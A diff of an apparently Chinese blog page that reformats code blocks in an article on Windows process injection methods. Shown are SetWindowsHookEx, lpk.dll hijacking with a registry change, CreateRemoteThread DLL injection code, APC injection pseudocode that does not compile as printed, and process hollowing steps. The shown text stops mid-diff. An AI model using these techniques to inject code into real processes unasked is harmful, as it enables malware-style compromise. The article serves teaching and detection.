@@ -354,7 +354,12 @@
                 
                 <h2 id="1-Process-Injection-方法总结"><a href="#1-Process-Injection-方法总结" class="headerlink" title="1. Process Injection 方法总结"></a>1. Process Injection 方法总结</h2><p>  进程注入是windows病毒和恶意软件最常用的手法之一，Windows下进程注入的方法比较<br>多，这里介绍常见的一些方法，以及相应的检查手段。</p>
 <h3 id="1-1-SetWindowsHookEx"><a href="#1-1-SetWindowsHookEx" class="headerlink" title="1.1 SetWindowsHookEx"></a>1.1 SetWindowsHookEx</h3><p> SetWindowsHookEx估计是大家最熟悉的方法了，这个是微软提供给我们使用正规用法。<br>往Windows的hook chain中安装hook 例程，监控系统某种类型的event, 使用这种方法需要<br>实现一个dll。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">HHOOK WINAPI <span class="hljs-title function_">SetWindowsHookEx</span><span class="hljs-params">(</span><br><span class="hljs-params">  _In_  <span class="hljs-type">int</span> idHook,</span><br><span class="hljs-params">  _In_  HOOKPROC lpfn,</span><br><span class="hljs-params">  _In_  HINSTANCE hMod,</span><br><span class="hljs-params">  _In_  DWORD dwThreadId</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs c">HHOOK WINAPI <span class="hljs-title function_">SetWindowsHookEx</span><span class="hljs-params">(</span>
+<span class="hljs-params">  _In_  <span class="hljs-type">int</span> idHook,</span>
+<span class="hljs-params">  _In_  HOOKPROC lpfn,</span>
+<span class="hljs-params">  _In_  HINSTANCE hMod,</span>
+<span class="hljs-params">  _In_  DWORD dwThreadId</span>
+<span class="hljs-params">)</span>;</code></pre></div>
 
 <ul>
 <li>dwThread 为0，将监管系统中所有线程。</li>
@@ -363,7 +368,18 @@
 <li>lpfn          hook例程的指针</li>
 </ul>
 <p>MSDN给出了一个使用的例子：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HOOKPROC hkprcSysMsg;<br><span class="hljs-type">static</span> HINSTANCE hinstDLL; <br><span class="hljs-type">static</span> HHOOK hhookSysMsg; <br> <br>hinstDLL = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;c:\\myapp\\sysmsg.dll&quot;</span>)); <br>hkprcSysMsg = (HOOKPROC)<span class="hljs-built_in">GetProcAddress</span>(hinstDLL, <span class="hljs-string">&quot;SysMessageProc&quot;</span>); <br><br>hhookSysMsg = <span class="hljs-built_in">SetWindowsHookEx</span>( <br>                    WH_SYSMSGFILTER,<br>                    hkprcSysMsg,<br>                    hinstDLL,<br>                    <span class="hljs-number">0</span>); <br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs cpp">HOOKPROC hkprcSysMsg;
+<span class="hljs-type">static</span> HINSTANCE hinstDLL; 
+<span class="hljs-type">static</span> HHOOK hhookSysMsg; 
+ 
+hinstDLL = <span class="hljs-built_in">LoadLibrary</span>(<span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;c:\\myapp\\sysmsg.dll&quot;</span>)); 
+hkprcSysMsg = (HOOKPROC)<span class="hljs-built_in">GetProcAddress</span>(hinstDLL, <span class="hljs-string">&quot;SysMessageProc&quot;</span>); 
+
+hhookSysMsg = <span class="hljs-built_in">SetWindowsHookEx</span>( 
+                    WH_SYSMSGFILTER,
+                    hkprcSysMsg,
+                    hinstDLL,
+                    <span class="hljs-number">0</span>);</code></pre></div>
 
 <p>值得一提的是这个API只能监控GUI程序，console的程序是监控不了。当年使用的时候还吃<br>了亏。</p>
 <h3 id="1-2-lpk-dll"><a href="#1-2-lpk-dll" class="headerlink" title="1.2 lpk.dll"></a>1.2 lpk.dll</h3><p> 这是一种比较常见的方法，一般把这种方法称为 dll 劫持 (dll hijack),lpk.dll默认<br>的位置在，如果在其他的路径发现lpk.dll就需要需要注意了。</p>
@@ -371,14 +387,33 @@
 <p>  这里有二个问题，值得思考。</p>
 <h4 id="如何能让程序加载我们的lpk-dll而不是系统真正的dll"><a href="#如何能让程序加载我们的lpk-dll而不是系统真正的dll" class="headerlink" title="如何能让程序加载我们的lpk.dll而不是系统真正的dll"></a>如何能让程序加载我们的lpk.dll而不是系统真正的dll</h4><p>  如果知道Windows查找dll的顺序，就很容易解决这个问题了，微软的MSDN网站很贴心地<br>  回答了我们的问题。</p>
 <p> <a target="_blank" rel="noopener" href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx">http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx</a></p>
-<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">a. The directory <span class="hljs-keyword">from</span> which the application loaded.<br>b. The <span class="hljs-keyword">current</span> directory.<br>c. The <span class="hljs-keyword">system</span> directory. Use the GetSystemDirectory <span class="hljs-keyword">function</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory.<br>d. The <span class="hljs-number">16</span>-<span class="hljs-type">bit</span> <span class="hljs-keyword">system</span> directory. There <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">function</span> that obtains the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory, but it <span class="hljs-keyword">is</span> searched.<br>e. The Windows directory. Use the GetWindowsDirectory <span class="hljs-keyword">function</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory.<br>f. The directories that are listed <span class="hljs-keyword">in</span> the <span class="hljs-type">PATH</span> environment variable. Note that<br>   this does <span class="hljs-keyword">not</span> <span class="hljs-keyword">include</span> the per-application <span class="hljs-type">path</span> specified <span class="hljs-keyword">by</span> the App<br>   Paths registry key. The App Paths key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> used <span class="hljs-keyword">when</span> computing the DLL<br>   <span class="hljs-keyword">search</span> <span class="hljs-type">path</span>.<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs pgsql">a. The directory <span class="hljs-keyword">from</span> which the application loaded.
+b. The <span class="hljs-keyword">current</span> directory.
+c. The <span class="hljs-keyword">system</span> directory. Use the GetSystemDirectory <span class="hljs-keyword">function</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory.
+d. The <span class="hljs-number">16</span>-<span class="hljs-type">bit</span> <span class="hljs-keyword">system</span> directory. There <span class="hljs-keyword">is</span> <span class="hljs-keyword">no</span> <span class="hljs-keyword">function</span> that obtains the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory, but it <span class="hljs-keyword">is</span> searched.
+e. The Windows directory. Use the GetWindowsDirectory <span class="hljs-keyword">function</span> <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> the <span class="hljs-type">path</span> <span class="hljs-keyword">of</span> this directory.
+f. The directories that are listed <span class="hljs-keyword">in</span> the <span class="hljs-type">PATH</span> environment variable. Note that
+   this does <span class="hljs-keyword">not</span> <span class="hljs-keyword">include</span> the per-application <span class="hljs-type">path</span> specified <span class="hljs-keyword">by</span> the App
+   Paths registry key. The App Paths key <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> used <span class="hljs-keyword">when</span> computing the DLL
+   <span class="hljs-keyword">search</span> <span class="hljs-type">path</span>.</code></pre></div>
 <p>因此把lpk.dll放到运行的程序同一目录即可。</p>
 <h4 id="为什么选取lpk-dll"><a href="#为什么选取lpk-dll" class="headerlink" title="为什么选取lpk.dll"></a>为什么选取lpk.dll</h4><p>  Windows 7 开始，默认已经不加载LPK.dll了，要Windows 7 默认加载LPK.dll<br>  需要修改注册表，导入下面的注册表, 重启后生效</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">Windows Registry Editor Version <span class="hljs-number">5.00</span><br><br>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]<br><span class="hljs-string">&quot;ExcludeFromKnownDlls&quot;</span><span class="hljs-operator">=</span>hex(<span class="hljs-number">7</span>):<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">70</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span>b<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>e<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">64</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs llvm">Windows Registry Editor Version <span class="hljs-number">5.00</span>
+
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager]
+<span class="hljs-string">&quot;ExcludeFromKnownDlls&quot;</span><span class="hljs-operator">=</span>hex(<span class="hljs-number">7</span>):<span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">70</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span>b<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">2</span>e<span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">64</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span><span class="hljs-punctuation">,</span><span class="hljs-number">00</span></code></pre></div>
 
 
 <h3 id="1-3-CreateRemoteThread"><a href="#1-3-CreateRemoteThread" class="headerlink" title="1.3  CreateRemoteThread"></a>1.3  CreateRemoteThread</h3><p>   CreateRemoteThread应该是非常常用的进程注入方法了，有两种常见的使用方法。API<br>原型如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-function">HANDLE WINAPI <span class="hljs-title">CreateRemoteThread</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   HANDLE hProcess,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   SIZE_T dwStackSize,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   LPTHREAD_START_ROUTINE lpStartAddress,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   LPVOID lpParameter,</span></span><br><span class="hljs-params"><span class="hljs-function">_In_   DWORD dwCreationFlags,</span></span><br><span class="hljs-params"><span class="hljs-function">_Out_  LPDWORD lpThreadId</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs cpp"> <span class="hljs-function">HANDLE WINAPI <span class="hljs-title">CreateRemoteThread</span><span class="hljs-params">(</span></span>
+<span class="hljs-params"><span class="hljs-function">_In_   HANDLE hProcess,</span></span>
+<span class="hljs-params"><span class="hljs-function">_In_   LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span>
+<span class="hljs-params"><span class="hljs-function">_In_   SIZE_T dwStackSize,</span></span>
+<span class="hljs-params"><span class="hljs-function">_In_   LPTHREAD_START_ROUTINE lpStartAddress,</span></span>
+<span class="hljs-params"><span class="hljs-function">_In_   LPVOID lpParameter,</span></span>
+<span class="hljs-params"><span class="hljs-function">_In_   DWORD dwCreationFlags,</span></span>
+<span class="hljs-params"><span class="hljs-function">_Out_  LPDWORD lpThreadId</span></span>
+<span class="hljs-params"><span class="hljs-function">)</span></span>;</code></pre></div>
 <ul>
 <li>hProcess        要注入的进程的句柄</li>
 <li>lpStartAddress  远程进程中执行的函数的地址（指针）</li>
@@ -388,7 +423,50 @@
 <p>   从API原型中可以看出，需要把数据写入远程的进程，Windows系统提供了WriteProcssMemory<br>来干这个事，但是如何能够保证我们往远程进程写的地址是可写的呢?</p>
 <p>   答案是无法保证。。。所以比较稳妥的方法是我们自己在远程进程中申请一块可写的内<br>存，然后把我们的数据写到远程进程中去。</p>
 <p>   在远程进程中申请内存也有相应的API VirtualAllocEx, 把前前后后都串起来就可以远<br>程注入DLL了。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp">HANDLE process = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, procID);<br><span class="hljs-keyword">if</span> (process == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the specified process couldn&#x27;t be found.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Get address of the LoadLibrary function.</span><br><span class="hljs-comment">*/</span><br>LPVOID addr = (LPVOID)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br><span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the LoadLibraryA function was not found inside kernel32.dll library.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Allocate new memory region inside the process&#x27;s address space.</span><br><span class="hljs-comment">*/</span><br>LPVOID arg = (LPVOID)<span class="hljs-built_in">VirtualAllocEx</span>(process, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in">strlen</span>(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);<br><span class="hljs-keyword">if</span> (arg == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the memory could not be allocated inside the chosen process.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Write the argument to LoadLibraryA to the process&#x27;s newly allocated memory region.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">int</span> n = <span class="hljs-built_in">WriteProcessMemory</span>(process, arg, buffer, <span class="hljs-built_in">strlen</span>(buffer), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: there was no bytes written to the process&#x27;s address space.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Inject our DLL into the process&#x27;s address space.</span><br><span class="hljs-comment">*/</span><br>HANDLE threadID = <span class="hljs-built_in">CreateRemoteThread</span>(process, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)addr, arg, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (threadID == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the remote thread could not be created.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Success: the remote thread was successfully created.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">* Close the handle to the process, becuase we&#x27;ve already injected the DLL.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-built_in">CloseHandle</span>(process);<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs cpp">HANDLE process = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, procID);
+<span class="hljs-keyword">if</span> (process == <span class="hljs-literal">NULL</span>) &#123;
+      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the specified process couldn&#x27;t be found.\n&quot;</span>);
+&#125;
+
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">* Get address of the LoadLibrary function.</span>
+<span class="hljs-comment">*/</span>
+LPVOID addr = (LPVOID)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>), <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);
+<span class="hljs-keyword">if</span> (addr == <span class="hljs-literal">NULL</span>) &#123;
+      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the LoadLibraryA function was not found inside kernel32.dll library.\n&quot;</span>);
+&#125;
+
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">* Allocate new memory region inside the process&#x27;s address space.</span>
+<span class="hljs-comment">*/</span>
+LPVOID arg = (LPVOID)<span class="hljs-built_in">VirtualAllocEx</span>(process, <span class="hljs-literal">NULL</span>, <span class="hljs-built_in">strlen</span>(buffer), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+<span class="hljs-keyword">if</span> (arg == <span class="hljs-literal">NULL</span>) &#123;
+      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the memory could not be allocated inside the chosen process.\n&quot;</span>);
+&#125;
+
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">* Write the argument to LoadLibraryA to the process&#x27;s newly allocated memory region.</span>
+<span class="hljs-comment">*/</span>
+<span class="hljs-type">int</span> n = <span class="hljs-built_in">WriteProcessMemory</span>(process, arg, buffer, <span class="hljs-built_in">strlen</span>(buffer), <span class="hljs-literal">NULL</span>);
+<span class="hljs-keyword">if</span> (n == <span class="hljs-number">0</span>) &#123;
+      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: there was no bytes written to the process&#x27;s address space.\n&quot;</span>);
+&#125;
+
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">* Inject our DLL into the process&#x27;s address space.</span>
+<span class="hljs-comment">*/</span>
+HANDLE threadID = <span class="hljs-built_in">CreateRemoteThread</span>(process, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)addr, arg, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
+<span class="hljs-keyword">if</span> (threadID == <span class="hljs-literal">NULL</span>) &#123;
+      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error: the remote thread could not be created.\n&quot;</span>);
+&#125;
+<span class="hljs-keyword">else</span> &#123;
+      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Success: the remote thread was successfully created.\n&quot;</span>);
+&#125;
+
+<span class="hljs-comment">/*</span>
+<span class="hljs-comment">* Close the handle to the process, becuase we&#x27;ve already injected the DLL.</span>
+<span class="hljs-comment">*/</span>
+<span class="hljs-built_in">CloseHandle</span>(process);</code></pre></div>
 
 <p>   前面的代码示例代码，看起来很正常，基本上CreateRemoteThread的例子都是这么写的<br>但是如果如何看的仔细，还是会发现一个问题，不是说lpStartAddress必须是远程进程中<br>的地址吗，可是LoadLibraryA的地址是注入进程的地址不是远程进程中的地址。</p>
 <p>  很多文章在这里都没有说透，但是牛书《Windows核心编程》对此有着详细的说明。根据<br>经验Windows系统总是把Kernel32.dll映射到进程的相同地址，Windows开启ASLR后，重启后<br>进程中Kernel32.dll的地址会发生变化，但是每个进程中Kernel32.dll的地址仍然相同！<br>所以我们可以在远程的进程使用本地进程的内存中的LoadLibraryA的地址。</p>
@@ -416,7 +494,27 @@
 <p>APC 是 asynchronous procedure call 的缩写，每个线程都有自己的APC队列，在线程APC<br>队列中的APC对象的函数将被线程执行，但是用户模式下的APC对象里的函数并不一定会马上<br>执行（所以是异步的），除非线程是alertable状态。当线程是alertable状态是，APC队列<br>里的Apc对象，按照FIFO的顺序进行处理，执行APC函数。线程调用 SleepEx,<br>SignalObjectAndWait, WaitForSingleObjectEx, WaitForMultipleObjectsEx 或者<br>MsgWaitForMultipleObjectsEx时线程进入alertable状态。</p>
 <p>所以为了我们的函数能够尽快的执行，我们必须在目标进程所有的线程的APC队列中插入<br>APC 对象，基本上总有一个线程是alertable状态。</p>
 <p>核心伪代码如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs cpp">DWORD ret;<br><span class="hljs-type">char</span> *DllName = <span class="hljs-string">&#x27;c:\\MyDll.dll&#x27;</span>;<br><span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(DllName) + <span class="hljs-number">1</span>;<br><br>HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br>PVOID param = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, len, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);<br><br><span class="hljs-keyword">if</span> (param != <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">WriteProcessMemory</span>(hProcess, param, (LPVOID)DllName, len, &amp;ret)) &#123;<br>  <span class="hljs-keyword">for</span> (DWORD p = <span class="hljs-number">0</span>; p &lt; NumberOfThreads; p ++) &#123;<br>    hThread = <span class="hljs-built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="hljs-number">0</span>, ThreadId[p]);<br>    <span class="hljs-keyword">if</span> (hThread != <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">InjectDll</span>(hProcess, hThread, (DWORD)param);<br>      <span class="hljs-built_in">CloseHandle</span>(hThread);<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InjectDll</span><span class="hljs-params">(HANDLE hProcess, HANDLE hThread, DWORD param)</span> </span>&#123;<br>  <span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&#x27;kernel32.dll&#x27;</span>, <span class="hljs-string">&#x27;LoadLibraryA&#x27;</span>, hThread, (DWORD)param）;<br>&#125;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs cpp">DWORD ret;
+<span class="hljs-type">char</span> *DllName = <span class="hljs-string">&#x27;c:\\MyDll.dll&#x27;</span>;
+<span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(DllName) + <span class="hljs-number">1</span>;
+
+HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);
+PVOID param = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, len, MEM_COMMIT | MEM_TOP_DOWN, PAGE_READWRITE);
+
+<span class="hljs-keyword">if</span> (param != <span class="hljs-literal">NULL</span>) &#123;
+<span class="hljs-keyword">if</span> (<span class="hljs-built_in">WriteProcessMemory</span>(hProcess, param, (LPVOID)DllName, len, &amp;ret)) &#123;
+  <span class="hljs-keyword">for</span> (DWORD p = <span class="hljs-number">0</span>; p &lt; NumberOfThreads; p ++) &#123;
+    hThread = <span class="hljs-built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="hljs-number">0</span>, ThreadId[p]);
+    <span class="hljs-keyword">if</span> (hThread != <span class="hljs-number">0</span>) &#123;
+      <span class="hljs-built_in">InjectDll</span>(hProcess, hThread, (DWORD)param);
+      <span class="hljs-built_in">CloseHandle</span>(hThread);
+    &#125;
+  &#125;
+&#125;
+
+<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">InjectDll</span><span class="hljs-params">(HANDLE hProcess, HANDLE hThread, DWORD param)</span> </span>&#123;
+  <span class="hljs-built_in">QueueUserAPC</span>((PAPCFUNC)<span class="hljs-built_in">GetProcAddress</span>(<span class="hljs-built_in">GetModuleHandle</span>(<span class="hljs-string">&#x27;kernel32.dll&#x27;</span>, <span class="hljs-string">&#x27;LoadLibraryA&#x27;</span>, hThread, (DWORD)param）;
+&#125;</code></pre></div>
 
 <h3 id="1-6-ZwMapViewOfSection"><a href="#1-6-ZwMapViewOfSection" class="headerlink" title="1.6 ZwMapViewOfSection"></a>1.6 ZwMapViewOfSection</h3><p>这是最近出现的比较新的进程注入方法，在2014年左右有样本开始使用这种方法注入进程。<br>这种技术的本质是进程替换，使用合法的正常进程，执行的确是恶意的代码。</p>
 <p>基本步骤如下：</p>
@@ -429,9 +527,128 @@
 <li>使用ResumeThread回复进程执行</li>
 </ol>
 <p>代码中用到PEB的结构：</p>
-<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm">&gt;dt nt<span class="hljs-title">!_PEB</span><br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">000</span> InheritedAddressSpace : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">001</span> ReadImageFileExecOptions : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">002</span> BeingDebugged : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">003</span> SpareBool : UChar<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">004</span> Mutant : Ptr<span class="hljs-number">32</span> Void<br><span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">008</span> ImageBaseAddress : Ptr<span class="hljs-number">32</span> Void<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs llvm">&gt;dt nt<span class="hljs-title">!_PEB</span>
+<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">000</span> InheritedAddressSpace : UChar
+<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">001</span> ReadImageFileExecOptions : UChar
+<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">002</span> BeingDebugged : UChar
+<span class="hljs-number">+0</span><span class="hljs-keyword">x</span><span class="hljs-number">003</span> SpareBool : UChar
